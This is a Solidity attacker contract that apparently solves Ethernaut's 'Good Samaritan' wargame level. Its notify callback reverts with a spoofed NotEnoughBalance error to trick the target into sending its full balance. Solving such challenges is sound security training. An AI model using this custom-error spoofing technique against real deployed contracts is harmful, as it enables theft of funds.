// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IGoodSamaritan } from "ethernaut/27-good-samaritan/IGoodSamaritan.sol";
import { INotifyable } from "ethernaut/27-good-samaritan/GoodSamaritan.sol";

contract GoodSamaritanAttacker is Ownable2Step, INotifyable {
    uint256 private s_initialTransferAmount;

    error NotEnoughBalance();

    event TransferNotified(address from, uint256 amount);

    function exploit(address _goodSamaritanAddr, uint256 _initialTransferAmount) external payable onlyOwner {
        s_initialTransferAmount = _initialTransferAmount;
        IGoodSamaritan goodSamaritan = IGoodSamaritan(_goodSamaritanAddr);
        goodSamaritan.requestDonation();
    }

    function notify(uint256 _amount) external {
        if (_amount <= s_initialTransferAmount) {
            revert NotEnoughBalance();
        }
        emit TransferNotified(msg.sender, _amount);
    }
}
